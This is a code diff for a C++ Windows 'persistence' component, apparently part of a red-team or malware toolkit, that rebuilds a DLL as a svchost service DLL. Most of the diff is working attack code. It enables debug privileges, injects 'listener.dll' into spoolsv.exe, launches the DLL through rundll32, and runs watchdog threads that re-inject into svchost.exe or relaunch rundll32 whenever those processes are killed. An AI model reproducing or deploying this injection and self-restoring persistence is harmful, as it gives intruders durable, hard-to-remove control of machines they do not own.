@@ -1,51 +1,34 @@
+// source: https://www.ired.team/offensive-security/persistence/persisting-in-svchost.exe-with-a-service-dll-servicemain
+
 #include "persistence.hpp"
+#define SVCNAME TEXT("psts")
 
+SERVICE_STATUS serviceStatus;
+SERVICE_STATUS_HANDLE serviceStatusHandle;
+HANDLE stopEvent = NULL;
 std::string componentName = "persistence";
+DWORD host;
 
-BOOL WINAPI DllMain(
-    HINSTANCE hinstDLL,  // handle to DLL module
-    DWORD fdwReason,     // reason for calling function
-    LPVOID lpvReserved)  // reserved
-{
-    // Perform actions based on the reason for calling.
-    switch (fdwReason)
-    {
-    case DLL_PROCESS_ATTACH:
-        // Initialize once for each new process.
-        // Return FALSE to fail DLL load.
-        Init();
-        break;
-
-    case DLL_THREAD_ATTACH:
-        // Do thread-specific initialization.
-        break;
-
-    case DLL_THREAD_DETACH:
-        // Do thread-specific cleanup.
-        break;
-
-    case DLL_PROCESS_DETACH:
-
-        if (lpvReserved != nullptr)
-        {
-            break; // do not do cleanup if process termination scenario
-        }
-
-        // Perform any necessary cleanup.
-        break;
-    }
-    return TRUE;  // Successful DLL_PROCESS_ATTACH.
-}
-
-int Init() {
-	Log("[+] Starting " + componentName + ".", componentName);
-	Log("[*] Running as " + GetUserAndContext(), componentName);
+void Init() {
+    Log("[+] Starting " + componentName + ".", componentName);
+    Log("[*] Running as " + GetUserAndContext(), componentName);
 
     EnableDebugPrivs();
 
-    ProcessInjection(FindTarget(L"spoolsv.exe"), L"C:\\Windows\\System32\\Persistence\\listener.dll");
+    DWORD spoolsvPID = FindTarget(L"spoolsv.exe");
+    ProcessInjection(spoolsvPID, L"C:\\Windows\\System32\\Persistence\\listener.dll");
 
-	return 0;
+    Sleep(5000);
+
+    CreateProc("listener", "cmd.exe /c rundll32.exe C:\\Windows\\System32\\Persistence\\listener.dll");
+
+    std::thread guardThread(Guard, spoolsvPID);
+    std::thread guardDLLThread(GuardRunDLL);
+
+    guardThread.join();
+    guardDLLThread.join();
+
+    return;
 }
 
 // enable debug privs of current process
@@ -91,12 +74,16 @@ DWORD FindTarget(std::wstring targetProc) {
     PROCESSENTRY32W pe;
     pe.dwSize = sizeof(PROCESSENTRY32W);
 
-    Log("[*] Finding target process .", componentName);
+    #pragma warning( push )
+    #pragma warning( disable : 4244) // loss of data wstring -> string
+    Log("[*] Finding target process " + std::string(targetProc.begin(), targetProc.end()), componentName);
+    #pragma warning( pop ) 
 
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 1);
     std::unique_ptr<void, decltype(&CloseHandle)> uphSnapshot(static_cast<void*>(hSnapshot), CloseHandle);
     if (hSnapshot == INVALID_HANDLE_VALUE || !Process32FirstW(hSnapshot, &pe)) {
-        return 1; // list of processes is invalid or empty
+        Log("[!] CreateToolhelp32Snapshot failed.", componentName);
+        return target; // list of processes is invalid or empty
     }
 
     do {
@@ -108,10 +95,16 @@ DWORD FindTarget(std::wstring targetProc) {
     } while (Process32NextW(hSnapshot, &pe) && !foundProc);
 
     if (target != 0) {
-        Log("[+] Found target process.", componentName);
+        #pragma warning( push )
+        #pragma warning( disable : 4244) // loss of data wstring -> string
+        Log("[+] Found target process " + std::string(targetProc.begin(), targetProc.end()), componentName);
+        #pragma warning( pop ) 
     }
     else {
-        Log("[!] Failed to find target process.", componentName);
+        #pragma warning( push )
+        #pragma warning( disable : 4244) // loss of data wstring -> string
+        Log("[!] Failed to find target process " + std::string(targetProc.begin(), targetProc.end()), componentName);
+        #pragma warning( pop ) 
     }
 
     return target;
@@ -130,7 +123,7 @@ int ProcessInjection(DWORD targetPID, std::wstring dllPath) {
     std::unique_ptr<void, decltype(&CloseHandle)> uphTargetProcess(static_cast<void*>(hTargetProcess), CloseHandle);
     std::unique_ptr<void, decltype(&CloseHandle)> uphInjectedThread(static_cast<void*>(hInjectedThread), CloseHandle);
 
-    Log("[*] Injecting into target process .", componentName);
+    Log("[*] Injecting into target process " + std::to_string(targetPID), componentName);
 
     // check that the dll to inject exists
     std::filesystem::path fsDLLPath = dllPath;
@@ -198,7 +191,117 @@ int ProcessInjection(DWORD targetPID, std::wstring dllPath) {
         return 8; // create thread failed
     }
 
-    Log("[+] Injected into target process .", componentName);
+    Log("[+] Injected into target process " + std::to_string(targetPID), componentName);
 
     return 0;
 }
+
+void Guard(DWORD pid) {
+    while (true) {
+        HANDLE proc = OpenProcess(SYNCHRONIZE, FALSE, pid);
+        std::unique_ptr<void, decltype(&CloseHandle)> upproc(static_cast<void*>(proc), CloseHandle);
+
+        if (proc == INVALID_HANDLE_VALUE || proc == NULL) {
+            Log("[!] Failed to get handle to host proc: " + std::to_string(GetLastError()), componentName);
+            return;
+        }
+
+        DWORD r = WaitForSingleObject(proc, INFINITE);
+        CloseHandle(proc);
+        if (r == WAIT_OBJECT_0) {
+            Log("[!] Error waiting for host proc: " + std::to_string(GetLastError()), componentName);
+            return;
+        }
+
+        Log("[*] Service pid " + std::to_string(pid) + " closed. Reinjecting", componentName);
+
+        pid = FindTarget(L"svchost.exe");
+        ProcessInjection(pid, L"C:\\Windows\\System32\\Persistence\\listener.dll");
+    }
+}
+
+void GuardRunDLL() {
+    while (true) {
+        DWORD pid = FindTarget(L"rundll32.exe");
+
+        HANDLE proc = OpenProcess(SYNCHRONIZE, FALSE, pid);
+        std::unique_ptr<void, decltype(&CloseHandle)> upproc(static_cast<void*>(proc), CloseHandle);
+
+        if (proc == INVALID_HANDLE_VALUE || proc == NULL) {
+            Log("[!] Failed to get handle to host proc: " + std::to_string(GetLastError()), componentName);
+            return;
+        }
+
+        DWORD r = WaitForSingleObject(proc, INFINITE);
+        CloseHandle(proc);
+        if (r == WAIT_OBJECT_0) {
+            Log("[!] Error waiting for host proc: " + std::to_string(GetLastError()), componentName);
+            return;
+        }
+
+        Log("[*] RunDLL32 pid " + std::to_string(pid) + " closed. Rerunning", componentName);
+
+        CreateProc("listener", "cmd.exe /c rundll32.exe C:\\Windows\\System32\\Persistence\\listener.dll");
+    }
+}
+
+VOID UpdateServiceStatus(DWORD currentState)
+{
+    serviceStatus.dwCurrentState = currentState;
+    SetServiceStatus(serviceStatusHandle, &serviceStatus);
+}
+
+DWORD ServiceHandler(DWORD controlCode, DWORD eventType, LPVOID eventData, LPVOID context)
+{
+    switch (controlCode)
+    {
+    case SERVICE_CONTROL_STOP:
+        serviceStatus.dwCurrentState = SERVICE_STOPPED;
+        SetEvent(stopEvent);
+        break;
+    case SERVICE_CONTROL_SHUTDOWN:
+        serviceStatus.dwCurrentState = SERVICE_STOPPED;
+        SetEvent(stopEvent);
+        break;
+    case SERVICE_CONTROL_PAUSE:
+        serviceStatus.dwCurrentState = SERVICE_PAUSED;
+        break;
+    case SERVICE_CONTROL_CONTINUE:
+        serviceStatus.dwCurrentState = SERVICE_RUNNING;
+        break;
+    case SERVICE_CONTROL_INTERROGATE:
+        break;
+    default:
+        break;
+    }
+
+    UpdateServiceStatus(SERVICE_RUNNING);
+
+    return NO_ERROR;
+}
+
+VOID ExecuteServiceCode()
+{
+    stopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
+    UpdateServiceStatus(SERVICE_RUNNING);
+
+    Init();
+
+    while (1)
+    {
+        WaitForSingleObject(stopEvent, INFINITE);
+        UpdateServiceStatus(SERVICE_STOPPED);
+        return;
+    }
+}
+
+extern "C" {__declspec(dllexport) VOID WINAPI ServiceMain(DWORD argC, LPWSTR* argV)
+{
+    serviceStatusHandle = RegisterServiceCtrlHandler(SVCNAME, (LPHANDLER_FUNCTION)ServiceHandler);
+
+    serviceStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
+    serviceStatus.dwServiceSpecificExitCode = 0;
+
+    UpdateServiceStatus(SERVICE_START_PENDING);
+    ExecuteServiceCode();
+}}
